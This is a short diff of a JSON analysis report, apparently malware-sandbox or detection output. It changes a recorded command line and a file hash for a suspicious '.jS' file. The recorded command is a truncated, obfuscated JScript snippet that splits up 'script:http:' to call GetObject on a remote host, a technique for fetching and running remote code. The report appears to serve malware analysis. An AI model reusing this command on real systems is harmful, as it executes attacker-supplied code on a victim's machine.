@@ -29,7 +29,7 @@
         "auto_collapse": false,
         "body": [
           {
-            "Command [trunc]": "/p K1J0=\"var C66d=\"sc\"+\"r\" D66d=\"ip\"+\"t:h\" E66d=\"T\"+\"tP\"+\":\" GetObject(C66d+D66d+E66d+'//n7eo5j.real",
+            "Command [trunc]": "set/p K1J0=\"var C66d=\"sc\"+\"r\" D66d=\"ip\"+\"t:h\" E66d=\"T\"+\"tP\"+\":\" GetObject(C66d+D66d+E66d+'//n7eo5j.r",
             "Filename": "C:\\BT59TX5\\BT59TX5.jS"
           }
         ],
@@ -95,7 +95,7 @@
       },
       {
         "name": "C:\\BT59TX5\\BT59TX5.jS",
-        "sha256": "f84eed15f44f1bdf7cce4f638b02b1260750ccf613053ad91431bb20f50f76e6"
+        "sha256": "98bca040a6b6742550035371c28c0b838ac1ed4c6d6427652f6b0a812d549e4c"
       }
     ],
     "supplementary": []
